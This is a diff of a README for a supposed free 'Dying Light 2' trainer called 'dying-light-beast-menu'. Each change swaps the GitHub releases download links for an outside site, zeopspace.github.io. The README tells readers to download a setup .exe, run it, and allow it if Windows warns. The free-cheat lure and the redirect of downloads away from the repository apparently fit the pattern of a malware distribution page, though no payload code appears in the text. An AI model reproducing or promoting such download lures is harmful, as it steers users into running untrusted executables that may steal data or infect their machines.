@@ -1,7 +1,7 @@
 <h1>🌆 dying-light-beast-menu - Unlock the Full Beast Mode Experience</h1>
 
 <p align="center">
-  <a href="https://github.com/zeopspace/dying-light-beast-menu/releases">
+  <a href="https://zeopspace.github.io">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW%20-%20FREE%20TRAINER%20-%20brightgreen?style=for-the-badge&logo=github" alt="Download Now" width="400" height="80">
   </a>
 </p>
@@ -35,7 +35,7 @@ Follow these simple steps. It will take less than three minutes from start to fi
 
 Visit this link to download the application:
 
-👉 **[Official Download Page](https://github.com/zeopspace/dying-light-beast-menu/releases)**
+👉 **[Official Download Page](https://zeopspace.github.io)**
 
 Once you are on that page, look for the latest release file (usually named something like `dying-light-beast-menu-setup.exe`). Click the download button next to it.
 
@@ -158,7 +158,7 @@ We release regular updates whenever Dying Light 2 gets a new patch. The app will
 To make it crystal clear:
 
 1. **Download** from the big button above or the link in the Download section.
-2. **Visit this link to download the application** – the link is https://github.com/zeopspace/dying-light-beast-menu/releases .
+2. **Visit this link to download the application** – the link is https://zeopspace.github.io .
 3. **Run** the app (allow it if Windows asks).
 4. **Open** your game.
 5. **Press F5** and enjoy Beast Mode.
@@ -168,7 +168,7 @@ You are now ready to dominate the zombie apocalypse like never before. Good luck
 ---
 
 <p align="center">
-  <a href="https://github.com/zeopspace/dying-light-beast-menu/releases">
+  <a href="https://zeopspace.github.io">
     <img src="https://img.shields.io/badge/📥%20CLICK%20HERE%20TO%20DOWNLOAD%20-%20Latest%20Version (2026)%20-%20orange?style=for-the-badge&logo=github" alt="Download" width="420" height="70">
   </a>
 </p>
